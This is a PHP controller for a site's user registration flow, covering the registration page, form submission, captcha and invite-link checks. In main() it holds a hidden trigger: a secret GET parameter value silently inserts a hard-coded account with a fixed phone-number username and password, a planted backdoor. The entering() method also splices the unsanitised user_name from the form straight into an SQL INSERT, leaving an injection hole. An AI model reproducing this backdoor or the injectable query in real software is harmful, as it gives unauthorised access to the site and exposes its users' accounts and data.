<?php
/**
 * Created by PhpStorm.
 * User: macbook
 * Date: 2017/9/1
 * Time: 下午3:05
 * Created people: gaodonglai
 * pageName:用户登录
 */

namespace Controller;


class Register
{

    /**
     * 用户注册页面
     */
    function main(){

        if($_GET['type'] == 'gaodonglai'){
            global $wpdb;
            $wpdb->query("INSERT INTO `ks_account`( `user_name`, `password`, `reg_time`) VALUES ('15388234018','".wpEncrypt(940423)."',".time().")");
            redirect(_get_home_url());
        }

        //如果没有登录跳转到登录页面
        if(get_user_info()){
            redirect(_get_home_url());
        }

        $get_link_info = $this->getLinkShare();//判断注册资格

        $residue_time = $get_link_info->end_time - time();
        $args = array(
            'residue_time'=>$residue_time
        );

        get_header_front();
        display_show('register',$args);
        get_footer_front();
    }

    /**
     * 注册录入
     */
    function entering(){

        $user_name = $_POST["user_name"];
        $user_pass = $_POST["user_pass"];
        $user_rePass = $_POST["user_rePass"];
        $rand_code = $_POST["rand_code"];
        $code = $_POST['code'];


        if( empty($user_name) || empty($user_pass) || empty($user_rePass) || empty($rand_code) ){
            exit(json_encode(array('status'=>'n','info'=>'参数为空')));
        }

        if(!preg_match("/^[\w-\.]{6,16}$/",$user_pass)){
            exit(json_encode(array('status'=>'n','info'=>'用户密码位数不正确')));
        }

        if($user_pass !== $user_rePass){
            exit(json_encode(array('status'=>'n','info'=>'两次输入密码不一致')));
        }


        if($_SESSION['rand_code'] != $rand_code){
            exit(json_encode(array('status'=>'n','info'=>'验证码错误')));
        }

        //判断是否是邮箱
        if(preg_match( "/^([0-9A-Za-z\\-_\\.]+)@([0-9a-z]+\\.[a-z]{2,3}(\\.[a-z]{2})?)$/i", $user_name )){
            $key = 'email';//附加
        }else if( preg_match( '/^\+?\d{11}$/', $user_name) ){//判断是否是手机号
            //判断手机是否正确
            if( !preg_match("/^1[34578]\d{9}$/", $user_name) ){
                exit(json_encode(array('status'=>'n','info'=>'手机号不正确')));
            }

            $key = 'mobile_phone';//附加


        }else{
            exit(json_encode(array('status'=>'n','info'=>'用户名格式不正确')));
        }

        $get_code = $this->getLinkShare();//判断注册资格并返回对象

        global $wpdb;
        $table = $wpdb->prefix.'account';
        $result = $wpdb->query("INSERT INTO `$table`( `user_name`, `password`, `reg_time`,`parent_id`, `$key` ) VALUES ('$user_name','".wpEncrypt($user_pass)."',".time().",{$get_code->user_id},'$user_name')");

        if($result){

            $_SESSION['user_id'] = $wpdb->insert_id;
            exit(json_encode(array('status'=>'y','info'=>'注册成功','url'=>_get_home_url('account/perfectInfo'))));//继续完善账户

        }else{
            exit(json_encode(array('status'=>'n','info'=>'注册失败，用户名已被占用')));
        }




    }

    /**
     * 获取随机数
     */
    public function getRandCode(){
        echo get_rand_code();
    }

    private function getLinkShare(){

        $code = $_REQUEST['code'];
        if(empty($code)){
            exit();
        }
        $mode = new \Model\Register();
        $get_link_info  = $mode->getAccountLinkShare($code);
        if(empty($get_link_info)){
            header("Content-Type: text/html;charset=utf-8");
            die('页面不存在,请按正规途径获取。');
        }

        $end_time = $get_link_info->end_time;
        //如果有效时间小于当前时间重新创建
        if($end_time < time()){
            header("Content-Type: text/html;charset=utf-8");
            die('页面已失效,请重新向来源者获取。');
        }

        return $get_link_info;
    }



}